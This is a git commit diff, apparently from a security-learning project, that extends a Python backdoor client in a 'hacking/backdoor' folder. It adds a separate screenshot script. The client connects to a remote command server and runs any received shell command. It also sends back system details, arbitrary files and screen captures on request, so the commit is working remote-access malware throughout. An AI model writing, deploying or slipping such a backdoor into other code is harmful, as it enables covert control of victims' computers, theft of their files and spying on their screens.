4003c7ffd601d56f1c4c513bbf94508aa454078b
Amelie Richioud <leiamellei9@gmail.com>
2025-07-25 11:51:50 +0200

    Backdoor end

--- hacking/backdoor/backdoor_client.py
+++ hacking/backdoor/backdoor_client.py
@@ -1,11 +1,14 @@
+
 import socket
 import time
 import subprocess
+import platform
+import os
+from PIL import ImageGrab
 
 HOST_IP = "127.0.0.1"
 HOST_PORT = 32000
 MAX_DATA_SIZE = 1024
-
 
 print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
 while True:
@@ -13,25 +16,68 @@ while True:
         s = socket.socket()
         s.connect((HOST_IP, HOST_PORT))
     except ConnectionRefusedError:
-        print("Connexion au serveur impossible, Reconnexion ...")
+        print("ERREUR : impossible de se connecter au serveur. Reconnexion...")
         time.sleep(4)
     else:
         print("Connecté au serveur")
         break
 
+# ....
 while True:
-    commande_data =s.recv(MAX_DATA_SIZE)
+    commande_data = s.recv(MAX_DATA_SIZE)
     if not commande_data:
         break
     commande = commande_data.decode()
-    print("Commande : ",commande)
-    resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
-    reponse = resultat.stdout + resultat.stderr
+    print("Commande : ", commande)
 
-    if not reponse or len(reponse) == 0:
-        reponse = ""
+    commande_split = commande.split(" ")
+
+    if commande == "infos":
+        reponse = platform.platform() + " " + os.getcwd()
+        reponse = reponse.encode()
+    elif len(commande_split) == 2 and commande_split[0] == "cd":
+        try:
+            os.chdir(commande_split[1].strip("'"))
+            reponse = " "
+        except FileNotFoundError:
+            reponse = "ERREUR : ce répertoire n'exite pas"
+        reponse = reponse.encode()
+    elif len(commande_split) == 2 and commande_split[0] == "dl":
+        try:
+            f = open(commande_split[1], "rb")
+        except FileNotFoundError:
+            reponse = " ".encode()
+        else:
+            reponse = f.read()
+            f.close()
+    elif len(commande_split) == 2 and commande_split[0] == "capture":
+            capture_ecran = ImageGrab.grab()
+            capture_filename = commande_split[1] + ".png"
+            capture_ecran.save(capture_filename, "PNG")
+            try:
+                f = open(capture_filename, "rb")
+            except FileNotFoundError:
+                reponse = " ".encode()
+            else:
+                reponse = f.read()
+                f.close()
+    else:
+        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
+        reponse = resultat.stdout + resultat.stderr
+        if not reponse or len(reponse) == 0:
+            reponse = " "
+        reponse = reponse.encode()
+
+    # reponse est déjà encodé
+    data_len = len(reponse)
+    header = str(data_len).zfill(13)
+    print("header:", header)
+    s.sendall(header.encode())
+    if data_len > 0:
+        s.sendall(reponse)
     
-    
-    s.sendall(reponse.encode())
+    # handshake
 
 s.close()
+
+
---
+++ hacking/backdoor/capture_ecran.py
@@ -0,0 +1,5 @@
+from PIL import ImageGrab
+
+capture_ecran = ImageGrab.grab()
+#capture_ecran.show()
+capture_ecran.save("capture.png", "PNG")
